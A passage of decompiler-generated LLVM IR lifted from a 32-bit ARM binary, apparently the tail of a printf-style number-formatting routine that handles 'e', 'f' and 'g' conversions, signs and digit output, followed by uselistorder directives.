  store i32 %v2_141f8, i32* %r2.global-to-local, align 4
  %v2_1420c = icmp eq i32 %v2_141f8, 0
  store i1 %v2_1420c, i1* %cpsr_z.global-to-local, align 1
  %v2_14210 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_14210, i32* %lr.global-to-local, align 4
  %tmp237 = icmp slt i32 %v2_141f8, 1
  br i1 %tmp237, label %.thread145, label %dec_label_pc_14224

.thread145:                                       ; preds = %dec_label_pc_14208
  %v7_14218 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_14218, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_14224:                               ; preds = %dec_label_pc_14208
  store i32 ptrtoint (i32* @global_var_1ad5b.611 to i32), i32* %r3.global-to-local, align 4
  %v2_14234 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_14234, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_14270

dec_label_pc_14250:                               ; preds = %dec_label_pc_141f4
  store i1 %v2_141d4, i1* %cpsr_z.global-to-local, align 1
  %v2_14254 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_14254, i32* %lr.global-to-local, align 4
  br i1 %v2_141d4, label %bb238, label %bb239

bb238:                                            ; preds = %dec_label_pc_14250
  %v3_1425c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_1425c, i32* @r7, align 4
  br label %.thread34

bb239:                                            ; preds = %dec_label_pc_14250
  %v3_14260 = sub i32 %v2_141e8, %v1_1426030
  store i32 %v3_14260, i32* %ip.global-to-local, align 4
  %v3_1426463 = add i32 %v5_141d0, %v1_1426030
  store i32 %v3_1426463, i32* %r6.global-to-local, align 4
  %v3_14268 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_14268, i32* @r7, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread145, %bb238, %bb239
  %v1_142b0261 = phi i32 [ %v3_1425c, %bb238 ], [ %v3_14268, %bb239 ], [ %v7_14218, %.thread145 ]
  %v0_14284100 = phi i32 [ %v2_141e8, %bb238 ], [ %v3_14260, %bb239 ], [ 0, %.thread145 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14270

dec_label_pc_14270:                               ; preds = %.thread, %dec_label_pc_14224, %.thread34
  %v1_142b0 = phi i32 [ %v2_14234, %dec_label_pc_14224 ], [ %v1_142b0261, %.thread34 ], [ %v5_141ec, %.thread ]
  %v0_142c4107 = phi i32 [ -1, %dec_label_pc_14224 ], [ -1, %.thread34 ], [ %v1_1426030, %.thread ]
  %v0_14284 = phi i32 [ 0, %dec_label_pc_14224 ], [ %v0_14284100, %.thread34 ], [ %v2_141e8, %.thread ]
  %v3_14270 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14270, i32* %r2.global-to-local, align 4
  %v1_14274 = add i32 %v3_14270, 12
  %v2_14274 = inttoptr i32 %v1_14274 to i32*
  %v3_14274 = load i32, i32* %v2_14274, align 4
  %v1_14278 = and i32 %v3_14274, 16
  store i32 %v1_14278, i32* %r4.global-to-local, align 4
  %v2_14278 = icmp eq i32 %v1_14278, 0
  %tmp266 = zext i1 %v2_14278 to i32
  %.255 = xor i32 %tmp266, 1
  store i32 %.255, i32* %r3.global-to-local, align 4
  %v2_14284 = icmp eq i32 %v0_14284, 0
  store i1 %v2_14284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14284, label %bb242, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_14270
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_142a0

bb242:                                            ; preds = %dec_label_pc_14270
  store i1 %v2_14278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14278, label %dec_label_pc_14294, label %dec_label_pc_142a0

dec_label_pc_14294:                               ; preds = %bb242
  %v0_14294 = load i32, i32* %sb.global-to-local, align 4
  %v7_14294 = icmp eq i32 %v0_14294, 103
  store i1 %v7_14294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14294, label %dec_label_pc_142c4, label %bb243

bb243:                                            ; preds = %dec_label_pc_14294
  %v1_14298 = load i32, i32* %fp.global-to-local, align 4
  %v3_14298 = icmp eq i32 %v1_14298, 0
  store i1 %v3_14298, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v1_14298, 1
  br i1 %tmp244, label %dec_label_pc_142c4, label %dec_label_pc_142a0

dec_label_pc_142a0:                               ; preds = %.thread37, %bb242, %bb243
  store i32 142964, i32* %lr.global-to-local, align 4
  %v2_142b0 = inttoptr i32 %v1_142b0 to i32*
  store i32 112, i32* %v2_142b0, align 4
  store i32 ptrtoint (i32* @global_var_1ad68.612 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_142bc = load i32, i32* @r7, align 4
  %v1_142bc = add i32 %v0_142bc, 4
  %v2_142bc = inttoptr i32 %v1_142bc to i32*
  store i32 1, i32* %v2_142bc, align 4
  %v4_142bc = add i32 %v0_142bc, 8
  %v5_142bc = inttoptr i32 %v4_142bc to i32*
  %v6_142bc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_142bc, i32* %v5_142bc, align 4
  %v0_142c0 = load i32, i32* @r7, align 4
  %v1_142c0 = add i32 %v0_142c0, 12
  store i32 %v1_142c0, i32* @r7, align 4
  %v0_142c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_142c4

dec_label_pc_142c4:                               ; preds = %dec_label_pc_14294, %bb243, %dec_label_pc_142a0
  %v1_142e4 = phi i32 [ %v1_142b0, %bb243 ], [ %v1_142c0, %dec_label_pc_142a0 ], [ %v1_142b0, %dec_label_pc_14294 ]
  %v0_142c4 = phi i32 [ %v0_142c4107, %bb243 ], [ %v0_142c4.pre, %dec_label_pc_142a0 ], [ %v0_142c4107, %dec_label_pc_14294 ]
  %v1_142c4 = add i32 %v0_142c4, 1
  store i32 %v1_142c4, i32* @lr, align 4
  %v6_142c4 = icmp slt i32 %v1_142c4, 0
  %v7_142c4 = icmp eq i32 %v1_142c4, 0
  store i1 %v7_142c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_142c4, label %dec_label_pc_142cc, label %dec_label_pc_142f0

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142c4
  store i32 ptrtoint (i32* @global_var_1ad5b.611 to i32), i32* %r3.global-to-local, align 4
  %v1_142dc = sub i32 -1, %v0_142c4
  store i32 %v1_142dc, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_142e4 = inttoptr i32 %v1_142e4 to i32*
  store i32 176, i32* %v2_142e4, align 4
  %v0_142e8 = load i32, i32* @r7, align 4
  %v1_142e8 = add i32 %v0_142e8, 4
  %v2_142e8 = inttoptr i32 %v1_142e8 to i32*
  %v3_142e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_142e8, i32* %v2_142e8, align 4
  %v4_142e8 = add i32 %v0_142e8, 8
  %v5_142e8 = inttoptr i32 %v4_142e8 to i32*
  %v6_142e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_142e8, i32* %v5_142e8, align 4
  %v0_142ec = load i32, i32* @r7, align 4
  %v1_142ec = add i32 %v0_142ec, 12
  store i32 %v1_142ec, i32* @r7, align 4
  br label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %dec_label_pc_142c4, %dec_label_pc_142cc
  %v2_142f8 = phi i32 [ %v1_142e4, %dec_label_pc_142c4 ], [ %v1_142ec, %dec_label_pc_142cc ]
  %v0_142f0 = load i32, i32* %ip.global-to-local, align 4
  %v2_142f0 = icmp eq i32 %v0_142f0, 0
  store i1 %v2_142f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142f0, label %.thread46, label %bb245

bb245:                                            ; preds = %dec_label_pc_142f0
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_142f8 = inttoptr i32 %v2_142f8 to i32*
  store i32 112, i32* %v3_142f8, align 4
  %v1_142fc = load i32, i32* %r6.global-to-local, align 4
  %v2_142fc = load i32, i32* @r7, align 4
  %v3_142fc = add i32 %v2_142fc, 8
  %v4_142fc = inttoptr i32 %v3_142fc to i32*
  store i32 %v1_142fc, i32* %v4_142fc, align 4
  %v1_14300 = load i32, i32* %ip.global-to-local, align 4
  %v2_14300 = load i32, i32* @r7, align 4
  %v3_14300 = add i32 %v2_14300, 4
  %v4_14300 = inttoptr i32 %v3_14300 to i32*
  store i32 %v1_14300, i32* %v4_14300, align 4
  %v1_14304 = load i32, i32* @r7, align 4
  %v2_14304 = add i32 %v1_14304, 12
  store i32 %v2_14304, i32* @r7, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_142f0, %bb245
  %v1_1433c = phi i32 [ %v2_142f8, %dec_label_pc_142f0 ], [ %v2_14304, %bb245 ]
  %v0_14308 = load i32, i32* %sb.global-to-local, align 4
  %v7_14308 = icmp eq i32 %v0_14308, 103
  store i1 %v7_14308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14308, label %dec_label_pc_14310, label %dec_label_pc_14318

dec_label_pc_14310:                               ; preds = %.thread46
  %v0_14310 = load i32, i32* %r4.global-to-local, align 4
  %v2_14310 = icmp eq i32 %v0_14310, 0
  store i1 %v2_14310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14310, label %dec_label_pc_14348, label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %.thread46, %dec_label_pc_14310
  %v0_14318 = load i32, i32* @lr, align 4
  %v1_14318 = load i32, i32* %ip.global-to-local, align 4
  %v2_14318 = sub i32 %v1_14318, %v0_14318
  store i32 %v2_14318, i32* %r1.global-to-local, align 4
  %v1_1431c = load i32, i32* %fp.global-to-local, align 4
  %v2_1431c = sub i32 %v2_14318, %v1_1431c
  %v4_1431c = xor i32 %v1_1431c, %v2_14318
  %v5_1431c = xor i32 %v2_1431c, %v2_14318
  %v6_1431c = and i32 %v5_1431c, %v4_1431c
  %v7_1431c = icmp slt i32 %v6_1431c, 0
  %v8_1431c = icmp slt i32 %v2_1431c, 0
  %v9_1431c = icmp eq i32 %v2_14318, %v1_1431c
  store i1 %v9_1431c, i1* %cpsr_z.global-to-local, align 1
  %v2_14320 = xor i1 %v8_1431c, %v7_1431c
  br i1 %v2_14320, label %dec_label_pc_14324, label %dec_label_pc_14348

dec_label_pc_14324:                               ; preds = %dec_label_pc_14318
  %v2_14330 = sub i32 %v1_1431c, %v2_14318
  store i32 %v2_14330, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ad5b.611 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1433c = inttoptr i32 %v1_1433c to i32*
  store i32 176, i32* %v2_1433c, align 4
  %v0_14340 = load i32, i32* @r7, align 4
  %v1_14340 = add i32 %v0_14340, 4
  %v2_14340 = inttoptr i32 %v1_14340 to i32*
  %v3_14340 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_14340, i32* %v2_14340, align 4
  %v4_14340 = add i32 %v0_14340, 8
  %v5_14340 = inttoptr i32 %v4_14340 to i32*
  %v6_14340 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_14340, i32* %v5_14340, align 4
  %v0_14344 = load i32, i32* @r7, align 4
  %v1_14344 = add i32 %v0_14344, 12
  store i32 %v1_14344, i32* @r7, align 4
  br label %dec_label_pc_14348

dec_label_pc_14348:                               ; preds = %dec_label_pc_14318, %dec_label_pc_14310, %dec_label_pc_14324
  %v1_143dc.pre.pre = phi i32 [ %v1_1433c, %dec_label_pc_14318 ], [ %v1_1433c, %dec_label_pc_14310 ], [ %v1_14344, %dec_label_pc_14324 ]
  %v0_14348 = load i32, i32* %r8.global-to-local, align 4
  %v7_14348 = icmp eq i32 %v0_14348, 102
  store i1 %v7_14348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14348, label %dec_label_pc_143d0, label %dec_label_pc_14350

dec_label_pc_14350:                               ; preds = %dec_label_pc_14348
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14354 = load i32, i32* %r0.global-to-local, align 4
  %v1_14354 = icmp slt i32 %v0_14354, 0
  %v2_14354 = icmp eq i32 %v0_14354, 0
  store i1 %v2_14354, i1* %cpsr_z.global-to-local, align 1
  %v4_14358 = select i1 %tmp270, i32 %v4_14074123127, i32 101
  store i32 %v4_14358, i32* @r4, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_14368 = sub i32 0, %v0_14354
  %storemerge155 = select i1 %v1_14354, i32 %v4_14368, i32 %v0_14354
  %tmp267 = ashr i32 %v0_14354, 31
  %tmp268 = and i32 %tmp267, 2
  %tmp269 = add nuw nsw i32 %tmp268, 43
  store i32 %storemerge155, i32* %r5.global-to-local, align 4
  store i32 %tmp269, i32* %sl.global-to-local, align 4
  %v2_14370 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_14370, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14378

dec_label_pc_14378:                               ; preds = %dec_label_pc_143a8, %dec_label_pc_14378, %dec_label_pc_14350
  %v0_14378 = phi i32 [ %storemerge155, %dec_label_pc_14350 ], [ %v0_14394, %dec_label_pc_14378 ], [ %v0_14394, %dec_label_pc_143a8 ]
  store i32 %v0_14378, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_14380 = call i32 @function_cd70(i32 %v0_14378, i32 10)
  store i32 58, i32* %r3.global-to-local, align 4
  %v0_14388 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14388, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v2_14390 = load i32, i32* %r6.global-to-local, align 4
  %v3_14390 = add i32 %v2_14390, -1
  %v4_14390 = inttoptr i32 %v3_14390 to i8*
  store i8 58, i8* %v4_14390, align 1
  %v5_14390 = load i32, i32* %r6.global-to-local, align 4
  %v6_14390 = add i32 %v5_14390, -1
  store i32 %v6_14390, i32* %r6.global-to-local, align 4
  %v0_14394 = call i32 @function_cc44()
  store i32 %v0_14394, i32* %r0.global-to-local, align 4
  %v0_14398 = load i32, i32* %r8.global-to-local, align 4
  %v1_14398 = add i32 %v0_14398, 1
  store i32 %v1_14398, i32* %r8.global-to-local, align 4
  %v7_1439c = icmp eq i32 %v1_14398, 3
  store i1 %v7_1439c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14394, i32* %r5.global-to-local, align 4
  br i1 %v7_1439c, label %dec_label_pc_14378, label %dec_label_pc_143a8

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14378
  %v2_143a8 = icmp eq i32 %v0_14394, 0
  store i1 %v2_143a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143a8, label %dec_label_pc_143b0, label %dec_label_pc_14378

dec_label_pc_143b0:                               ; preds = %dec_label_pc_143a8
  %v0_143b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_143b0 = add i32 %v0_143b0, -1
  store i32 %v1_143b0, i32* %r3.global-to-local, align 4
  %v0_143b4 = load i32, i32* %sl.global-to-local, align 4
  %v1_143b4 = trunc i32 %v0_143b4 to i8
  %v4_143b4 = inttoptr i32 %v1_143b0 to i8*
  store i8 %v1_143b4, i8* %v4_143b4, align 1
  %v0_143b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_143b8 = add i32 %v0_143b8, -1
  store i32 %v1_143b8, i32* %r2.global-to-local, align 4
  %v0_143bc = load i32, i32* @r4, align 4
  %v1_143bc = trunc i32 %v0_143bc to i8
  %v4_143bc = inttoptr i32 %v1_143b8 to i8*
  store i8 %v1_143bc, i8* %v4_143bc, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_143c4 = load i32, i32* @r7, align 4
  %v1_143c4 = inttoptr i32 %v0_143c4 to i32*
  store i32 112, i32* %v1_143c4, align 4
  %v3_143c4 = add i32 %v0_143c4, 4
  %v4_143c4 = inttoptr i32 %v3_143c4 to i32*
  %v5_143c4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_143c4, i32* %v4_143c4, align 4
  %v0_143c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_143c8 = load i32, i32* @r7, align 4
  %v2_143c8 = add i32 %v1_143c8, 8
  %v3_143c8 = inttoptr i32 %v2_143c8 to i32*
  store i32 %v0_143c8, i32* %v3_143c8, align 4
  %v0_143cc = load i32, i32* @r7, align 4
  %v1_143cc = add i32 %v0_143cc, 12
  store i32 %v1_143cc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_143d0

dec_label_pc_143d0:                               ; preds = %dec_label_pc_14348, %.thread121, %dec_label_pc_143b0
  %v1_143dc.pre = phi i32 [ %v2_13ea8, %.thread121 ], [ %v1_143cc, %dec_label_pc_143b0 ], [ %v1_143dc.pre.pre, %dec_label_pc_14348 ]
  %v2_143d0 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_143d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143d4

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143d4, %dec_label_pc_143d0
  %v0_143d4 = phi i32 [ %v2_143d0, %dec_label_pc_143d0 ], [ %v4_143d4, %dec_label_pc_143d4 ]
  %stack_var_-188.0 = phi i32 [ %v3_13d44, %dec_label_pc_143d0 ], [ %v2_143e0, %dec_label_pc_143d4 ]
  %v1_143d4 = inttoptr i32 %v0_143d4 to i32*
  %v2_143d4 = load i32, i32* %v1_143d4, align 4
  store i32 %v2_143d4, i32* %r3.global-to-local, align 4
  %v4_143d4 = add i32 %v0_143d4, 12
  store i32 %v4_143d4, i32* %r2.global-to-local, align 4
  %v3_143dc = icmp ult i32 %v4_143d4, %v1_143dc.pre
  %v2_143e0 = sub i32 %stack_var_-188.0, %v2_143d4
  store i32 %v2_143e0, i32* %ip.global-to-local, align 4
  br i1 %v3_143dc, label %dec_label_pc_143d4, label %dec_label_pc_143ec

dec_label_pc_143ec:                               ; preds = %dec_label_pc_143d4
  %v3_143ec = load i8, i8* %stack_var_-46, align 1
  %v4_143ec = sext i8 %v3_143ec to i32
  store i32 %v4_143ec, i32* %r3.global-to-local, align 4
  store i32 %v4_143ec, i32* %r2.global-to-local, align 4
  %v2_143f0 = icmp eq i8 %v3_143ec, 0
  store i1 %v2_143f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143f0, label %bb250, label %bb249

bb249:                                            ; preds = %dec_label_pc_143ec
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb250

bb250:                                            ; preds = %dec_label_pc_143ec, %bb249
  %v1_14450 = phi i32 [ %v4_143ec, %dec_label_pc_143ec ], [ 1, %bb249 ]
  %v2_143f8 = sub i32 %v2_143e0, %v1_14450
  store i32 %v2_143f8, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_14400 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_14400, i32* %r3.global-to-local, align 4
  %v2_14404 = icmp eq i32 %v2_143f8, 0
  store i1 %v2_14404, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp251 = icmp slt i32 %v2_143f8, 1
  br i1 %tmp251, label %dec_label_pc_1446c, label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %bb250
  %v3_14418 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14418, i32* %lr.global-to-local, align 4
  %v1_1441c = add i32 %v3_14418, 12
  %v2_1441c = inttoptr i32 %v1_1441c to i32*
  %v3_1441c = load i32, i32* %v2_1441c, align 4
  store i32 %v3_1441c, i32* %r3.global-to-local, align 4
  %v1_14420 = and i32 %v3_1441c, 8
  %v2_14420 = icmp eq i32 %v1_14420, 0
  store i1 %v2_14420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14420, label %dec_label_pc_14444, label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %dec_label_pc_14418
  store i32 142964, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ad5b.611 to i32), i32* %r3.global-to-local, align 4
  %v1_14438 = add i32 %v1_143dc.pre, 12
  store i32 %v1_14438, i32* %r6.global-to-local, align 4
  %v1_1443c = inttoptr i32 %v1_143dc.pre to i32*
  store i32 160, i32* %v1_1443c, align 4
  %v3_1443c = add i32 %v1_143dc.pre, 4
  %v4_1443c = inttoptr i32 %v3_1443c to i32*
  %v5_1443c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1443c, i32* %v4_1443c, align 4
  %v6_1443c = add i32 %v1_143dc.pre, 8
  %v7_1443c = inttoptr i32 %v6_1443c to i32*
  %v8_1443c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1443c, i32* %v7_1443c, align 4
  br label %dec_label_pc_14470

dec_label_pc_14444:                               ; preds = %dec_label_pc_14418
  store i32 %v3_14418, i32* %ip.global-to-local, align 4
  %v1_14448 = add i32 %v3_14418, 16
  %v2_14448 = inttoptr i32 %v1_14448 to i32*
  %v3_14448 = load i32, i32* %v2_14448, align 4
  store i32 %v3_14448, i32* %r3.global-to-local, align 4
  %v7_1444c = icmp eq i32 %v3_14448, 48
  store i1 %v7_1444c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1444c, label %.thread54.thread70, label %bb252

bb252:                                            ; preds = %dec_label_pc_14444
  store i32 %v2_143e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1446c

.thread54.thread70:                               ; preds = %dec_label_pc_14444
  %v4_14458 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_143dc.pre, i32* %r6.global-to-local, align 4
  %v3_14460 = add i32 %v4_14458, %v2_143f8
  store i32 %v3_14460, i32* %r3.global-to-local, align 4
  store i32 %v3_14460, i32* %stack_var_-164, align 4
  br label %dec_label_pc_14470

dec_label_pc_1446c:                               ; preds = %bb252, %bb250
  store i32 %v1_143dc.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14470

dec_label_pc_14470:                               ; preds = %.thread54.thread70, %dec_label_pc_14428, %dec_label_pc_1446c
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_14474 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_14474, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14478

dec_label_pc_14478:                               ; preds = %dec_label_pc_144a0, %dec_label_pc_14470
  %v0_14478 = phi i32 [ %v1_14494, %dec_label_pc_144a0 ], [ %v2_14474, %dec_label_pc_14470 ]
  %v1_14478 = inttoptr i32 %v0_14478 to i32*
  %v2_14478 = load i32, i32* %v1_14478, align 4
  store i32 %v2_14478, i32* %r1.global-to-local, align 4
  %v3_14478 = add i32 %v0_14478, 4
  %v4_14478 = inttoptr i32 %v3_14478 to i32*
  %v5_14478 = load i32, i32* %v4_14478, align 4
  store i32 %v5_14478, i32* %r2.global-to-local, align 4
  %v6_14478 = add i32 %v0_14478, 8
  %v7_14478 = inttoptr i32 %v6_14478 to i32*
  %v8_14478 = load i32, i32* %v7_14478, align 4
  store i32 %v8_14478, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 83084, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_1448c = load i32, i32* %r5.global-to-local, align 4
  %v1_1448c = add i32 %v0_1448c, 4
  %v2_1448c = inttoptr i32 %v1_1448c to i32*
  %v3_1448c = load i32, i32* %v2_1448c, align 4
  store i32 %v3_1448c, i32* %r3.global-to-local, align 4
  %v0_14490 = load i32, i32* %r0.global-to-local, align 4
  %v9_14490 = icmp eq i32 %v0_14490, %v3_1448c
  store i1 %v9_14490, i1* %cpsr_z.global-to-local, align 1
  %v1_14494 = add i32 %v0_1448c, 12
  store i32 %v1_14494, i32* %r5.global-to-local, align 4
  br i1 %v9_14490, label %dec_label_pc_144a0, label %bb253

bb253:                                            ; preds = %dec_label_pc_14478
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_144c0

dec_label_pc_144a0:                               ; preds = %dec_label_pc_14478
  %v0_144a4.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_144a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_144a0 = icmp ult i32 %v1_14494, %v1_144a0
  %v9_144a0 = icmp eq i32 %v1_14494, %v1_144a0
  store i1 %v9_144a0, i1* %cpsr_z.global-to-local, align 1
  %v2_144a4 = add i32 %v0_144a4.pre, %v3_1448c
  store i32 %v2_144a4, i32* %r7.global-to-local, align 4
  br i1 %v3_144a0, label %dec_label_pc_14478, label %dec_label_pc_144c0

dec_label_pc_144b8:                               ; preds = %.thread21, %bb235
  %v0_144b8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_144b8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_141b8

dec_label_pc_144c0:                               ; preds = %dec_label_pc_144a0, %bb253
  %v0_144c0 = phi i32 [ -1, %bb253 ], [ %v2_144a4, %dec_label_pc_144a0 ]
  store i32 %v0_144c0, i32* %r0.global-to-local, align 4
  store i32 %v3_13cfc, i32* %r4.global-to-local, align 4
  store i32 %v6_13cfc, i32* @r5, align 4
  store i32 %v9_13cfc, i32* @r6, align 4
  store i32 %v12_13cfc, i32* @r7, align 4
  store i32 %v27_13cfc, i32* @lr, align 4
  ret i32 %v0_144c0

; uselistorder directives
  uselistorder i32 %v0_144c0, { 1, 0 }
  uselistorder i32 %v1_144a0, { 1, 0 }
  uselistorder i32 %v1_14494, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14478, { 2, 1, 0 }
  uselistorder i32 %v3_14418, { 1, 0, 2, 3 }
  uselistorder i32 %v2_143e0, { 0, 1, 3, 2 }
  uselistorder i32 %v4_143d4, { 1, 2, 0 }
  uselistorder i32 %v0_143d4, { 1, 0 }
  uselistorder i32 %v1_143dc.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_14394, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_14378, { 1, 0 }
  uselistorder i32 %storemerge155, { 1, 0 }
  uselistorder i32 %v0_14354, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1431c, { 1, 0 }
  uselistorder i32 %v1_1431c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14318, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_14278, { 2, 1, 0 }
  uselistorder i32 %v2_141f8, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_141e8, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_141d4, { 1, 0, 2 }
  uselistorder i32 %v5_141d0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1426030, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_14188, { 1, 0 }
  uselistorder i32 %v1_14180, { 1, 2, 0 }
  uselistorder i32 %v2_14174, { 1, 0 }
  uselistorder i32 %v1_14174, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14174, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_14144, { 1, 0 }
  uselistorder i32 %v0_14144, { 0, 2, 1 }
  uselistorder i32 %v2_14140, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_1412c, { 1, 0 }
  uselistorder i1 %v2_1411c, { 1, 0 }
  uselistorder i32 %v1_14118, { 3, 2, 1, 0 }
  uselistorder i32 %v2_14114, { 1, 0 }
  uselistorder i1 %v2_14104, { 1, 0 }
  uselistorder i32 %v1_140f8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_140ac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_140ac, { 1, 0, 2 }
  uselistorder i1 %v2_14094, { 1, 0 }
  uselistorder i32 %v5_1407c, { 1, 0 }
  uselistorder i32 %v0_14068, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1404c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14028, { 1, 0 }
  uselistorder i32 %v0_13fe4, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13f8c, { 1, 0 }
  uselistorder i32 %v5_13f4c, { 1, 0, 2 }
  uselistorder i32 %v2_13f4c, { 1, 0, 2 }
  uselistorder i32 %v2_13f10, { 1, 0, 2 }
  uselistorder i32 %v0_13f0c, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_13f08, { 1, 0, 2, 3 }
  uselistorder i32 %v3_13f00, { 1, 0 }
  uselistorder i32 %v2_13f3c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_13ed0, { 1, 0 }
  uselistorder i32 %v5_13e8c, { 1, 0 }
  uselistorder i32 %v1_13dac.v0_13d985, { 1, 0 }
  uselistorder i32 %v3_13e68, { 1, 0 }
  uselistorder i32 %v0_13e44, { 3, 2, 1, 0 }
  uselistorder i32 %v2_13e2c, { 2, 1, 0 }
  uselistorder i32 %v0_13e10, { 2, 3, 1, 0 }
  uselistorder i32 %v0_13d30, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
